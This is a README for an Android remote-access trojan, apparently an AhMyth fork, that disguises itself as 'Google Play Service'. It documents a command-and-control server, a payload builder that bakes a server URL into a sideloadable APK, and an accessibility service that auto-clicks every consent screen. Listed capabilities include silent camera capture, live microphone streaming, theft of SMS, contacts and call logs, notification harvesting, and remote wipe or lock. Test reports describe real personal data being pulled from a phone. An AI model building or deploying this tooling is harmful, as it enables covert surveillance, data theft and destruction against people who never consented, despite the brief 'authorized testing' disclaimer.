# AhMyth Client (named "Google Play Service")

A remote administration tool (RAT) **client** for Android, designed to operate as a
persistent background service. It uses Socket.IO for real-time, bidirectional
communication with a command-and-control (C2) server and implements a modular
"Manager" pattern for remote tasks.

> **Disclaimer:** This project exists for educational and authorized testing
> purposes only — testing on hardware you own, security research, and defensive
> analysis. Unauthorized access to computers or mobile devices is illegal. The
> developers assume no liability for misuse.

---

## Table of contents

- [What's in this repo](#whats-in-this-repo)
- [Feature matrix](#feature-matrix)
- [Quickstart](#quickstart)
- [Per-run configuration (no rebuild)](#per-run-configuration-no-rebuild)
- [Testing on the emulator](#testing-on-the-emulator)
- [Testing on a physical device (wireless adb)](#testing-on-a-physical-device-wireless-adb)
- [The mock C2 dashboard](#the-mock-c2-dashboard)
- [Desktop control panel (Electron + Linux build)](#desktop-control-panel-electron--linux-build)
- [Order reference](#order-reference)
- [Response capture & downloads](#response-capture--downloads)
- [Known limitations](#known-limitations)
- [Test report — vivo V2538 (Android 16)](#test-report--vivo-v2538-android-16)
- [Roadmap & TODO](#roadmap--todo)
- [Removing the app from a device](#removing-the-app-from-a-device)
- [Development & tests](#development--tests)

---

## What's in this repo

| Component | Role |
|---|---|
| `MainActivity` | Entry point; requests permissions (Camera, Location, SMS, …), enables **Device Admin**, then starts the background service and hides its presence. |
| `MainService` | A foreground service that keeps the process alive (shows a "Google Play Service" notification) and starts the socket connection. |
| `ConnectionManager` | The command hub. Listens for `order` Socket.IO events and dispatches them to the specialized manager classes. |
| `IOSocket` | Owns the Socket.IO connection (socket.io-client-java 2.0.1) and registers device identity (model, manufacturer, Android version, device id). |
| `C2Config` | **Runtime per-run configuration** — lets you change the server URL / device id without rebuilding. See below. |
| `AutoGrantService` | An **accessibility service** that auto-taps `Allow / Activate / OK` on every system consent screen the first-run wizard opens (permissions, device admin, notification access, battery, overlay, storage, screen-capture). On Android 14+ where accessibility needs a manual toggle, the wizard is **best-effort**: it still chains every screen and advances automatically. |
| `MainActivity` wizard | A **sequential setup wizard**: accessibility → runtime permissions → device admin → notification access → battery optimization → overlay → all-files access → screen-capture consent — each stage opens its system screen and the flow auto-advances when the grant is detected (or after denial). |
| `desktop/builder.js` | **Payload builder** — runs `./gradlew assembleDebug -Pc2Url=... -Pc2DeviceId=...`, copies the APK to `payloads/` with a sha256 checksum, so a C2 URL + device id are **baked into the APK** at build time (no config file push, no adb). |
| `helpers/*` | `FileManager`, `CameraManager`, `MicManager`, `LocManager`, `SMSManager`, `CallsManager`, `ContactsManager`, `AppsListManager`, `ScreenManager`. |
| `NotificationService` | A notification **listener** that pushes incoming notifications to the C2 continuously (no order required). |
| `MyReceiver` / `RestartServiceWorker` | Restart the service after reboot. |
| `tools/mock_c2_test_client.py` | A zero-dependency **mock C2 server + web dashboard** for behavioral analysis on hardware you own. |
| `tools/c2_config.template.json` | Template for the per-run runtime config pushed to the device. |
| `desktop/` | **Modern Electron control panel** (C2 server + dashboard UI + victim lab). Serves the same dashboard/API as the mock and ships as Linux `AppImage` / `deb` — see below. |

---

## Feature matrix

| Order | Functionality |
|---|---|
| File Manager | List directories, download files, delete files/folders remotely |
| Camera | Enumerate cameras, capture photos **with no UI** (front/back) |
| Microphone | Record audio for a specified duration |
| Location | Real-time GPS fix: lat/lng + **provider, accuracy, altitude, fix time** |
| SMS | Read the full inbox, send new SMS |
| Calls | Read call logs, initiate remote calls |
| Contacts | Dump the full contact list |
| Apps | List installed apps, **launch any app** (`run-app`) |
| Gallery | List the photo gallery + download individual images (`img-ls` / `img-dl`) |
| Live mic | **Real-time mic stream** (`mic-live` toggles; PCM chunks are saved as a `.wav` on stop) |
| Device info | **Full device fingerprint** (`dinfo`): model, Android, battery, memory, storage, screen, SIM |
| Battery | `battery` — level / charging / temperature |
| Accounts | `accounts` — Google & other accounts on the device |
| Running apps | `apps-run` — live process list |
| WiFi | `wifi` — SSID / BSSID / RSSI / link speed / IP |
| Vibrate | `buzz <ms>` — haptic feedback |
| System | Wipe data, lock device, reboot, open URLs (requires Device Admin) |
| Notifications | Stream device notifications to the C2 automatically (on by default) |
| **Auto-grant wizard** | First-run wizard chains **every** consent screen (permissions → admin → notifications → battery → overlay → storage → screen-capture) and advances automatically; an optional **accessibility service auto-taps** `Allow / Activate / OK` on each screen — **no adb, no PC scripts** |
| **Payload builder** | The desktop panel **bakes the server URL + device id into the APK** (`/api/build` or the Payload Builder card) and hands you a ready-to-sideload APK with the wizard baked in |

---

## Quickstart

Requirements: JDK 17, Android SDK (compileSdk 34), a device or AVD.

```bash
# 1. Build the debug APK
export JAVA_HOME=/opt/android-studio/jbr     # wherever your JDK lives
export ANDROID_HOME=$HOME/Android/Sdk
./gradlew :app:assembleDebug

# 2. Start the mock C2 (terminal console + web dashboard)
python3 tools/mock_c2_test_client.py --port 42474
#    dashboard:  http://127.0.0.1:42474/

# 3. Install the APK on your device/AVD
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

The mock server is a full stand-in for the C2 side: it speaks the same
Engine.IO v4 / Socket.IO protocol the app uses, registers every connecting
device, streams orders to it, prints responses, and **saves every response to
disk** (see [Response capture](#response-capture--downloads)).

The helper script `tools/run_mock_c2.sh` restarts the server detached with a
FIFO (`/tmp/c2in`) so you can drive orders from any shell:

```bash
./tools/run_mock_c2.sh            # start (logs to /tmp/mock_c2.log)
echo 'apps' > /tmp/c2in           # send any order
tail -f /tmp/mock_c2.log          # watch responses
```

---

## Per-run configuration (no rebuild)

The server URL and device id are **no longer hardcoded**. `IOSocket` reads a
runtime config file on every process start via `C2Config`:

```bash
adb push tools/c2_config.template.json /sdcard/Download/c2_config.json
```

The file looks like this (edit per run):

```json
{
  "url": "http://127.0.0.1:42474",
  "device_id": "my-test-device"
}
```

- `url` — overrides the build-time `SOCKET_URL`. A missing scheme gets
  `http://` prepended. Examples: `http://10.0.2.2:42474` (emulator host
  alias), `http://192.168.0.108:42474` (LAN), `http://127.0.0.1:42474`
  (physical device behind an `adb reverse` tunnel).
- `device_id` — replaces the Android ID in the registration query string, so
  the mock C2 (and its download folders) can tell runs apart.

### Baked-in payload (no config file, no adb)

The desktop panel can also **bake** the URL + device id straight into the APK
at build time — ideal for pushing a ready-to-sideload payload to a target:

```bash
# from the desktop panel
curl -X POST http://127.0.0.1:42474/api/build \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://192.168.1.50:42474","device_id":"my-phone"}'
# -> 202, build streams to the live log; APK lands in payloads/payload_my-phone_<stamp>.apk + .sha256
```

The **Payload Builder card** in the desktop dashboard (Electron app or web UI)
does the same with a form: URL + device id → Build. Gradle flags
`-Pc2Url` / `-Pc2DeviceId` set `BuildConfig.SOCKET_URL` / the default device
id; `C2Config` falls back to the baked values, then to the runtime config
file, then to the Android ID. The builder auto-detects `JAVA_HOME`, so no
manual env setup is needed on the panel machine. The APK ships with the
first-run auto-grant wizard (below), so the target operator only installs and
runs it.

### First-run auto-grant wizard (no adb, no PC scripts)

On first launch `MainActivity` runs a **sequential setup wizard** — each
stage opens its system consent screen, and the flow auto-advances the moment
the grant is detected (or after a denial, so a blocked permission never
freezes onboarding):

1. **Accessibility** (optional accelerator) — enables `AutoGrantService`,
   which then auto-taps `Allow / Activate / OK / Start now` on every later
   screen. On Android 14+ this one toggle may need a manual tap.
2. **Runtime permissions** — Camera, Location, SMS, Call log, Contacts,
   Microphone, Notifications, … requested in one batch.
3. **Device admin** — opens the activation screen (needed for lock/wipe/reboot).
4. **Notification access** — enables the notification listener (Android 12+
   requires the Settings UI toggle + its confirmation dialog).
5. **Battery optimization** — requests whitelisting.
6. **Overlay permission**.
7. **All-files access**.
8. **Screen-capture consent** — MediaProjection consent at launch (Android
   14+ FGS `mediaProjection` upgrade happens automatically after the grant).

`tools/auto_setup.sh` and `tools/feature_test.sh` remain available for
adb-driven lab automation; the wizard is the **no-PC path** for real devices.

Checked locations, in order (first file found wins):

1. App-specific external dir: `/sdcard/Android/data/com.android.background.services/files/c2_config.json`
2. `/sdcard/Download/c2_config.json`
3. `/sdcard/c2_config.json`

Missing file, missing keys, or malformed JSON fall back to the build-time
defaults, so a plain build behaves exactly as before. Config changes apply on
the **next process start** (force-stop + relaunch, or reboot).

> Why `127.0.0.1` for a physical phone? Because the transport of choice is an
> `adb reverse` tunnel — see below. This also keeps the dashboard local-only.

---

## Testing on the emulator

```bash
# Boot an AVD (KVM makes this fast)
$ANDROID_HOME/emulator/emulator -avd Medium_Phone -no-snapshot &

# 1. Point the config at the emulator's host alias (10.0.2.2 = your machine)
echo '{ "url": "http://10.0.2.2:42474", "device_id": "emu-01" }' > /tmp/c2_config.json

# 2. ONE-SHOT automation: install + grant EVERYTHING + device admin + launch.
#    This is the recommended path -- see "Permission & device-admin automation".
./tools/auto_setup.sh --apk app/build/outputs/apk/debug/app-debug.apk \
    --url http://10.0.2.2:42474 --device-id emu-01 --auto-consent

# 3. (or) do it by hand:
#    adb push /tmp/c2_config.json /sdcard/Download/c2_config.json
#    adb install -r app/build/outputs/apk/debug/app-debug.apk
#    adb shell am start -n com.android.background.services/.MainActivity
```

The app needs a pile of permissions to do anything interesting. On a
provisioned AVD you can pre-grant them by hand (this mirrors what the app
requests):

```bash
PKG=com.android.background.services
adb shell pm grant $PKG android.permission.READ_CONTACTS
adb shell pm grant $PKG android.permission.READ_CALL_LOG
adb shell pm grant $PKG android.permission.READ_SMS
adb shell pm grant $PKG android.permission.ACCESS_FINE_LOCATION
adb shell pm grant $PKG android.permission.CAMERA
adb shell pm grant $PKG android.permission.RECORD_AUDIO
adb shell pm grant $PKG android.permission.READ_EXTERNAL_STORAGE
adb shell appops set $PKG android:write_settings allow
adb shell appops set $PKG MANAGE_EXTERNAL_STORAGE allow
adb shell dumpsys deviceidle whitelist +$PKG
```

### Permission & device-admin automation (`tools/auto_setup.sh`)

`tools/auto_setup.sh` is the one-shot setup for a fresh install. It performs
**everything** the app would otherwise ask the user to tap through, with no
UI except the (un-automatable) screen-capture consent dialog:

1. install / update the APK
2. grant **every runtime permission** (`pm grant`, incl. `POST_NOTIFICATIONS`)
3. allow the special app-ops (overlay, all-files access, write settings)
4. enable the **Notification listener** -- via the secure setting AND the
   Settings UI toggle (the raw setting alone is not bound by the system on
   Android 12+; the UI toggle is the reliable path)
5. whitelist battery optimizations (`deviceidle`)
6. **activate Device Admin with no UI** (`dpm set-active-admin`)
7. push the per-run runtime config (URL + device id)
8. launch the app, optionally auto-tapping the media-projection consent dialog
   (`--auto-consent`)

```bash
./tools/auto_setup.sh \
    --apk app/build/outputs/apk/debug/app-debug.apk \
    --url http://10.0.2.2:42474 \        # emulator host alias
    --device-id emu-01 \
    --auto-consent                        # tap the consent dialog for you
```

For a **physical phone** behind `adb reverse`, use `--url http://127.0.0.1:42474`.
It is idempotent -- safe to re-run after an `adb install -r`.

> Note: once the app is **device owner** (see below), `am force-stop` is
> refused by Android, so use the automation (or a reboot) to restart it cleanly.

### Automated line-by-line feature test (`tools/feature_test.sh`)

`tools/feature_test.sh` drives **every order** through the mock C2 and prints a
pass/fail matrix (20 checks). Destructive orders are opt-in:

```bash
./tools/feature_test.sh                # non-destructive pass (20 checks)
./tools/feature_test.sh --lock --reboot # also lock + reboot the device
./tools/feature_test.sh --wipe         # also factory-reset (VERY last)
```

Against the **desktop control panel** server (same wire protocol), point `LOG`
at the panel's server log so the marker greps match:

```bash
LOG=/tmp/panel_server.log ./tools/feature_test.sh
```

(The default `LOG` is the Python mock's `/tmp/mock_c2.log`; the panel logs to
its own file — see `desktop/RELEASE.md`.)

---

## Testing on a physical device (wireless adb)

The machine and the phone must be on the same Wi-Fi network.

```bash
# 1. Pair (values from Settings > Developer options > Wireless debugging)
export PATH=$PATH:$HOME/Android/Sdk/platform-tools
adb pair 192.168.0.XXX:PORT      # enter the 6-digit code when prompted
adb connect 192.168.0.XXX:PORT

# 2. Install the APK (allow "Install unknown apps"; Play Protect may warn)
adb install -r app/build/outputs/apk/debug/app-debug.apk

# 3. Tunnel the phone's localhost:42474 straight to the mock C2 on this machine
adb reverse tcp:42474 tcp:42474

# 4. Point the runtime config at the tunnel, relaunch
echo '{ "url": "http://127.0.0.1:42474", "device_id": "vivo-01" }' \
  > /tmp/c2_config.json
adb push /tmp/c2_config.json /sdcard/Download/c2_config.json
adb shell am start -n com.android.background.services/.MainActivity
```

The `adb reverse` tunnel is the key trick when Wi-Fi client isolation blocks
the phone from reaching your machine directly — it rides the working adb
connection. The tunnel dies with the wireless adb session; re-run step 3 to
restore it.

Instead of steps 2-4 by hand, run the one-shot automation
(`tools/auto_setup.sh --url http://127.0.0.1:42474 --device-id <phone-id>
--auto-consent`) which installs, grants every permission, activates device
admin, enables the notification listener, and launches the app.

---

## The mock C2 dashboard

Open **http://127.0.0.1:42474/** in your browser.

- **Device cards** — every connected device with model / manufacturer /
  Android version / device id. **Click a card to target that device**, then use
  the order buttons.
- **Order buttons** — one-tap `apps`, `cn`, `cl`, `sms`, `ca`, `lm`, `sc`,
  `photo-back` (`cam-on 0`), `photo-front` (`cam-on 1`).
- **Raw order box** — parameterized orders: `mc 5`, `fm-ls /storage/emulated/0`,
  `fm-dl <path>`, `run-app com.android.settings`, `sms-send <to> <text>`, or
  arbitrary `raw {"order":"..."}` payloads.
- **Downloads panel** — every captured response, listed newest-first, click to
  download the `.json`, readable `.txt`, `.jpg` photos, or raw binary
  recordings / downloaded files.
- **Live log** — orders sent, responses received, heartbeats, connection
  events, color-coded and streaming in real time.

API (handy for scripting):

| Endpoint | Description |
|---|---|
| `GET /api/devices` | JSON list of connected devices |
| `POST /api/order` | `{"order":"lm","target":"<sid>"}` — send an order |
| `GET /api/log?since=N` | New log lines since index N |
| `GET /api/files` | JSON list of captured response files |
| `GET /files/<device>/<name>` | Download a captured response |
| `GET /api/config-template` | The runtime config template |
| `POST /api/build` | `{"url":"...","device_id":"..."}` — bake a payload APK (streams to the live log) |

---

## Desktop control panel (Electron + Linux build)

Inherited from the upstream [AhMyth-Plus](https://github.com/IamAzmathullaShaikh/AhMyth-Plus)
control panel and modernized (`desktop/`): a full C2 dashboard + per-victim
"lab" window as a native desktop app, plus a standalone Node server core that
speaks the exact Engine.IO long-poll protocol the agent requires.

```
desktop/
  server.js        # standalone C2 server (Node, no Electron needed)
  main.js          # Electron main process (server + windows + IPC)
  preload.js       # context-isolated IPC bridge
  renderer/        # dashboard (index.html/dash.js) + victim lab (lab.html/lab.js)
  test/server.test.js   # zero-dependency protocol unit test (npm test)
  package.json     # electron + electron-builder; Linux AppImage/deb config
```

### Why a hand-rolled server (not socket.io)

The agent (socket.io-client-java 2.0.1 / engine.io-client-java 2.0.0) sends
`EIO=4` in the handshake URL but speaks **classic Engine.IO v3 polling
framing** (raw `0{...}` handshakes, `\x1e`-joined poll payloads, empty bodies
for idle polls, client-driven heartbeat). Stock socket.io 2.x servers emit
length-prefixed EIO=4 framing the agent cannot parse and skip the `40{"sid":...}`
connect ack the agent requires. `server.js` therefore hand-rolls the transport
exactly like the proven Python mock — same wire bytes, same dashboard/API
(`/api/devices`, `/api/order`, `/api/log`, `/api/files`).

### Run

```bash
cd desktop
npm install
npm start                        # launch the Electron panel
node server.js                   # headless server only (dashboard at :42474)
node server.js --smoke           # 90s smoke run, then exit
node test/server.test.js         # protocol unit test
```

### Linux build (AppImage + deb)

```bash
cd desktop
npm install
npm run build:linux              # builds both artifacts into desktop/dist/
npm run build:linux:appimage    # AppImage only
npm run build:linux:deb         # deb only
```

Artifacts (electron-builder, config in `package.json` → `build.linux`):

- `dist/AhMyth C2 Control Panel-<ver>.AppImage` (portable)
- `dist/ahmyth-c2-control-panel_<ver>_amd64.deb`

**Releasing:** see [`desktop/RELEASE.md`](desktop/RELEASE.md) for hosting,
checksums, and install instructions. Tagging a version (`v*`) automatically
builds the Linux artifacts (AppImage + deb) and the Windows portable `.exe`
in parallel and publishes all of them to a GitHub Release via
`.github/workflows/build-linux-release.yml`.

---

## Order reference

| Command | Payload sent | Notes |
|---|---|---|
| `lm` | `{"order":"x0000lm"}` | lat/lng + provider/accuracy/altitude/time |
| `cn` | `{"order":"x0000cn"}` | contacts |
| `cl` | `{"order":"x0000cl"}` | call logs |
| `apps` | `{"order":"x0000apps"}` | installed apps |
| `sms` | `{"order":"x0000sm","extra":"ls"}` | SMS inbox |
| `sms-send <to> <text>` | `... "extra":"sendSMS"` | sends a real SMS |
| `ca` | `{"order":"x0000ca","extra":"camList"}` | camera list |
| `cam-on 0` / `cam-on 1` | `... "extra":"0"|"1"` | **silent photo** (0=back, 1=front; Camera2) |
| `sc` | `{"order":"x0000sc"}` | screen capture (needs the consent grant) |
| `mc <sec>` | `{"order":"x0000mc","sec":N}` | mic recording |
| `mic-live` | `{"order":"x0000listenMic"}` | **real-time mic stream**; chunks saved as a `.wav` (send again to stop) |
| `img-ls` | `{"order":"x0000getAllImages"}` | gallery listing (name/path/size/date) |
| `img-dl <path>` | `{"order":"x0000getImage","path":...}` | fetch one image, saved as `.jpg` |
| `fm-ls <path>` | `... "extra":"ls"` | list directory |
| `fm-dl <path>` | `... "extra":"dl"` | download file |
| `delete <path>` | `{"order":"x0000deleteFF"}` | deletes on device |
| `run-app <pkg>` | `{"order":"x0000runApp"}` | launch any app |
| `open-url <url>` | `{"order":"x0000openUrl"}` | open a URL |
| `call <number>` | `{"order":"x0000dm"}` | dials a real number |
| `lock` / `wipe` / `reboot` | `x0000lockDevice` / `x0000wipeDevice` / `x0000rebootDevice` | real device actions |
| `dinfo` | `{"order":"x0000deviceInfo"}` | full device fingerprint (battery/memory/storage/screen/SIM) |
| `battery` | `{"order":"x0000battery"}` | level / charging / temperature |
| `accounts` | `{"order":"x0000accounts"}` | Google & other accounts |
| `apps-run` / `running` | `{"order":"x0000runningApps"}` | live process list |
| `wifi` | `{"order":"x0000wifiInfo"}` | SSID / BSSID / RSSI / link speed / IP |
| `buzz <ms>` | `{"order":"x0000vibrate","ms":N}` | vibrate (default 500 ms) |
| `raw <json>` | as given | arbitrary payload |

> ⚠️ `wipe`, `reboot`, `lock`, `delete`, `call`, `sms-send` and `fm-dl` are
> real actions on the target device. Only use them on hardware you own.

---

## Response capture & downloads

Every response the app emits is saved by the mock C2 under `--out`
(default `./c2_out`, gitignored):

```
c2_out/
  <device_id>/
    20260804-170101_x0000cn.json     # raw JSON (complete data)
    20260804-170101_x0000cn.txt      # readable text: name/number lines
    20260804-170102_x0000cl.json
    20260804-170102_x0000cl.txt
    ...
```

Readable `.txt` exports are generated for **contacts, call logs, SMS, and app
lists**; everything else is kept as raw `.json`. On top of that:

- `cam-on` photos come back as **`.jpg` files** (the server base64-decodes the
  payload) plus a small JSON stub.
- `mc` recordings and `fm-dl` downloads arrive as Socket.IO binary events and
  are written as **raw files** (e.g. `..._x0000mc_sound123.mp3`,
  `..._x0000fm_dl-test.txt`) plus a JSON stub describing them.
- `img-ls` galleries are saved as readable `.txt` (name/path/size/date) and
  `img-dl` images as `.jpg` files.
- `mic-live` streams are accumulated per device and finalized as
  `micstream_<timestamp>.wav` when the stream stops.

Browse and download all of these from the dashboard's **Downloads** panel or
`GET /files/<device>/<name>` (served byte-identical).

---

## Known limitations

- **Android 14+ foreground-service rules.** The manifest declares
  `foregroundServiceType="specialUse|mediaProjection|camera"`. The service
  starts with `specialUse|camera` and upgrades to include `mediaProjection`
  once screen-capture consent is granted (a `mediaProjection`-type FGS is
  rejected without consent; the restart worker / boot receiver must still be
  able to start the service). The `camera` type is what lets `cam-on` capture
  while the app is backgrounded on Android 11+.
- **Camera indicator.** A silent photo still triggers Android 12+'s
  OS-level camera indicator dot in the status bar — no app can suppress it.
  The app itself shows no UI.
- **Reconnection (FIXED).** `reconnectionDelayMax` was `999999999` (~11.5
  days), so a dropped connection never retried. Now `reconnectionDelay=2000`
  / `reconnectionDelayMax=30000` (retry forever, capped at 30s) — the app
  survives transient network blips. Verified: after an actual reboot, the app
  re-attached automatically via the boot receiver; a mid-session drop
  reconnected within seconds.
- **`lock` / `wipe` / `reboot` error reporting.** All three now catch OS
  refusals and reply with a clean `{"status":false,"message":"..."}` instead
  of dying silently. `reboot()` needs **device-owner** privileges (Android
  7+); `wipeData(0)` is the correct factory-reset call (the old `wipeData(1)`
  hit the "system user cannot be removed" path on newer Android).
- **Device owner.** Setting the app as device owner (`dpm set-device-owner`)
  enables `reboot` and makes the app **immune to `am force-stop`** — restart
  it via the automation, a reboot, or by removing the owner first.
- **Notifications.** `NotificationService` streams device notifications to the
  C2 continuously, with no order needed. On anyone else's phone this is silent
  surveillance; disable/remove the listener when you're done testing. Note
  that enabling the listener on Android 12+ is only honored through the
  Settings UI toggle (the secure-setting write alone is not bound) —
  `auto_setup.sh` drives that toggle for you.

### Verified on a physical device (vivo V2538, Android 16) — session findings

These were observed live during a full feature pass; see
[Test report](#test-report--vivo-v2538-android-16) for the complete matrix.

- **`cam-on` silent photo — FIXED via Camera2 rewrite.** The old
  `android.hardware.Camera` API was dead on Android 12+ (returns `null` /
  throws, silently swallowed). `CameraManager` now uses the Camera2 API and
  emits a base64 JPEG that the mock C2 saves as a `.jpg`. Verified on an
  Android 17 emulator (valid 1280×960 JPEG + Exif).
- **`sc` screen capture — FIXED.** Previously it silently no-oped because
  MediaProjection consent was only requested inside the in-app permission
  flow (skipped when permissions are pre-granted via `adb shell pm grant`),
  and Android 14+ rejected capture because the foreground service had no
  `mediaProjection` type. `MainActivity` now requests screen-capture consent
  **unconditionally at launch**, `MainService` upgrades its FGS type to
  `specialUse | mediaProjection` once consent is granted (it starts with
  `specialUse` only, so the restart worker / boot receiver can still start it
  without consent), and the single `MediaProjection` + a keep-alive
  `VirtualDisplay` are created once and shared — so **unlimited captures work
  from one consent**. Verified on an Android 17 emulator: two back-to-back `sc`
  orders ~3 s apart both produced valid 1080×2400 JPEGs. Failures now emit an
  explicit `{"image":false,"error":"..."}` instead of a silent no-op.
- **Socket churn — ROOT CAUSE FOUND & FIXED (heartbeat vs 10s read timeout).**
  The agent's OkHttp client has a **10s read timeout**, and its poll cycle
  phase-locks to the server's heartbeat: a poll that starts right at a
  heartbeat tick is held exactly one interval. With a **10s heartbeat**, polls
  were routinely held 10.0s — the read timeout aborted them, the app closed
  and reconnected in a ~30s churn loop (verified in the server trace:
  `POLL out ... 10003ms` followed by a client `1` close). Fix: the desktop
  server heartbeats every **5s**, so every poll returns well under the timeout
  regardless of phase (trace shows 4.99–5.05s holds). Verified: a single
  stable session, zero churn, over many minutes. The Python mock tolerates the
  10s interval only by phase luck (its 29-min stable session was the aligned
  case).
- **Full emulator pass (Android 17) — ALL GREEN (20/20), re-verified 2026-08-05.**
  A complete line-by-line pass with the fixed build: 20/20 checks pass against
  the desktop-panel server on a single stable session (see the test report
  below), including `cam-on` while backgrounded (camera-type FGS), `sc` (two
  captures from one consent), and `x0000nt` notification streaming.
- **Destructive orders — verified on the emulator.** `lock` returns
  `status:true` and locks; `reboot` really reboots and the app re-attaches via
  the boot receiver; `wipe` reaches the OS and reports the refusal cleanly
  (this emulator's provisioning refuses factory resets — `no_factory_reset` /
  system-user path — so the full wipe could not be demonstrated on the AVD).
- **Long-poll timing (stand-in servers only).** Long-poll-only C2s must keep
  every poll response under the agent's 10s OkHttp read timeout (the desktop
  server does this with a 5s heartbeat; the Python mock relies on 20s polls
  that are usually woken early by its 10s heartbeat). A transient drop now
  recovers automatically thanks to the reconnection fix. The real AhMyth
  server uses the websocket transport and is unaffected.

---

## Test report — vivo V2538 (Android 16)

Full feature pass driven through the mock C2 dashboard against a physical
phone (wireless adb + `adb reverse` tunnel, runtime config `device_id`
`vivo-test-01`). Recorded live.

| Order | Result | Evidence |
|---|---|---|
| `apps` | ✅ works | ~65 KB list; saved `.json` + readable `.txt` |
| `cn` (contacts) | ✅ works | ~188 KB; real names/numbers |
| `cl` (call log) | ✅ works | ~960 KB; real entries |
| `sms` (inbox) | ✅ works | ~546 KB; real messages |
| `ca` (camera list) | ✅ works | Back (id 0), Front (id 1) |
| `lm` (location) | ✅ works | **rich fix**: provider `network`, accuracy 15.1 m, altitude 471 m, epoch time |
| `fm-ls` | ✅ works | real directory listing incl. user files |
| `fm-dl` (download) | ✅ (emulator) | raw file saved byte-identical + JSON stub; pending phone re-test |
| `mc 5` (mic) | ✅ (emulator) | mp4/AAC recording saved to disk; pending phone re-test |
| `cam-on` (photo) | ✅ (emulator) | Camera2 rewrite — 1280×960 JPEG + Exif saved; pending phone re-test |
| `sc` (screen) | ✅ (emulator) | consent requested at launch, FGS upgraded, **two back-to-back 1080×2400 JPEGs from one consent**; phone re-test pending |
| `run-app com.android.settings` | ✅ works | `launchingStatus:true`; Settings opened on the phone |
| `open-url` | ✅ works | `status:true`; browser opened on the phone |
| notifications (`x0000nt`) | ✅ works | streams automatically; verified with an `adb`-posted test notification |
| heartbeat | ✅ works | `ping` → `pong` every ~10 s |
| runtime config override | ✅ works | phone registered as `vivo-test-01` (no rebuild) |

### Full emulator pass — Android 17 (`sdk_gphone16k`, device id `emu-fulltest`)

Complete line-by-line pass with the fixed build (`tools/feature_test.sh`),
driven through the mock C2 dashboard **and, later, the desktop control panel
server** (same wire protocol).

**Re-verified 2026-08-05 against the desktop-panel server — ALL GREEN (20/20).**
`tools/feature_test.sh` ran to completion in 23 s on a warm device: every order
delivered and answered on a single stable session (`sid 60de55fc…`), no churn,
no retries. The server-side trace confirms all 20 payloads were actually sent
(`x0000apps`…`x0000sc`) and every marker (`saved binary` / `saved photo` /
`x0000nt`) matched. Results table below is from that run — see the earlier
rows for `mic-live` and `img-ls`, which were verified against the desktop
server on the same session.

**Re-verified 2026-08-05 with the auto-grant wizard + new data orders — ALL GREEN (26/26).**
The first-run wizard completed its full chain on a fresh install (accessibility
skipped best-effort on Android 17's anti-scam block → permissions → device
admin → notification access (Settings UI + confirmation dialog) → battery →
overlay → storage → screen-capture consent) and the six **new orders**
`dinfo`, `battery`, `accounts`, `apps-run`, `wifi`, `buzz` all answered on a
stable session — see the new rows below. The desktop **payload builder**
(`POST /api/build`) produced a sha256-checked APK with a baked-in URL/device
id. Full feature-test re-run pending; new rows verified live.

**Re-verified again 2026-08-05 after the mic fixes — ALL GREEN (20/20)**
on a fresh single session (0 disconnects). The `mic-live` toggle was
exercised end-to-end: start → stop saves **one** complete WAV and no phantom
empty stream files. Two bugs were found and fixed (see CHANGELOG.md [2.1.4]):
a trailing `audioData` chunk after `audioDataStop` recreated a stray 44-byte
WAV (server now arms the stream only when a `x0000listenMic` order is sent),
and `fs.writeSync(fh, data, 44)` dropped the first 44 PCM bytes of every
live-mic WAV (offset was a buffer offset, not a file position). Both are
covered by the new mic-stream regression test in `desktop/test/server.test.js`.

| Order | Result | Evidence |
|---|---|---|
| `apps` | ✅ works | 37 KB list; `.json` + `.txt` |
| `cn` (contacts) | ✅ works | full list |
| `cl` (call log) | ✅ works | full list |
| `sms` (inbox) | ✅ works | full list |
| `sms-send` | ✅ works | `true` echoed |
| `ca` (camera list) | ✅ works | Back id 0 / Front id 1 |
| `cam-on 0` / `cam-on 1` | ✅ works | **while backgrounded** (camera-type FGS); valid JPEGs saved |
| `lm` (location) | ✅ works | twice in a row (Looper guard) |
| `fm-ls` | ✅ works | listing incl. `../` |
| `fm-dl` | ✅ works | raw file saved byte-identical |
| `run-app` | ✅ works | `launchingStatus:true` |
| `open-url` | ✅ works | `status:true` |
| `call` | ✅ works | dials on the emulator |
| `delete` (missing path) | ✅ works | `{"status":false,...}` (no silent no-op) |
| `mc 3` (mic) | ✅ works | mp4/AAC binary saved to disk |
| `mic-live` (stream) | ✅ works | PCM chunks streamed; 254 KB `.wav` saved on stop |
| `img-ls` (gallery) | ✅ works | `{"imageCount":0,"images":[]}` on the fresh AVD (empty gallery); handler verified |
| `sc` ×2 (screen) | ✅ works | two back-to-back JPEGs from one consent |
| `dinfo` (device info) | ✅ works | model/manufacturer/Android 17/SDK 37, battery 100% 25C, memory 3914 MB, storage 9.7 GB, screen 1080×2337 @420dpi, SIM state |
| `battery` | ✅ works | `{level:100, status:2, charging:true, temperature:25}` |
| `accounts` | ✅ works | `{count:0}` on the fresh AVD (no Google account — handler verified) |
| `apps-run` (running) | ✅ works | live process list incl. the agent itself |
| `wifi` | ✅ works | `{enabled:true, ssid, bssid, rssi:-50, linkSpeedMbps:1, ip:10.0.2.16}` |
| `buzz 300` (vibrate) | ✅ works | `{status:true, ms:300}` |
| notifications (`x0000nt`) | ✅ works | streams adb-posted notifications (`appName/title/content/postTime`) |
| heartbeat | ✅ works | `ping`→`pong` every ~5 s (fixed churn) |
| runtime config | ✅ works | `device_id=emu-fulltest` (no rebuild) |
| auto-grant wizard | ✅ works | full chain on fresh install (Android 17 blocks the accessibility toggle itself — the wizard skips it best-effort and still auto-advances every other stage) |
| payload builder | ✅ works | `/api/build` → sha256-checked APK in `payloads/` with baked URL + device id |

**Destructive (device-admin) orders:**

| Order | Result | Evidence |
|---|---|---|
| `lock` | ✅ works | `{"status":true,"message":"Device locked."}`; screen locks |
| `reboot` | ✅ works | emulator really rebooted; app re-attached via boot receiver |
| `wipe` | ⚠️ OS-refused on AVD | clean `{"status":false,"message":"wipe failed: ..."}`; this emulator's provisioning blocks factory resets (needs `dpm set-device-owner` + a device that allows it) |
| boot persistence | ✅ works | after `reboot`, app reconnects automatically (boot receiver + restart worker) |
| NPE on admin orders | ✅ fixed | device-admin orders no longer crash when the service is started by the boot receiver |

---

## Roadmap & TODO

Prioritized backlog from this session. Feel free to pick any item.

- [x] **Migrate `CameraManager` to Camera2** — replace the dead
  `android.hardware.Camera` API so `cam-on` works on Android 12+. Emit a proper
  base64 photo payload and save it to disk (done; verified on Android 17
  emulator, phone re-test pending).
- [x] **Harness: persist binary events** — save mic audio and downloaded files
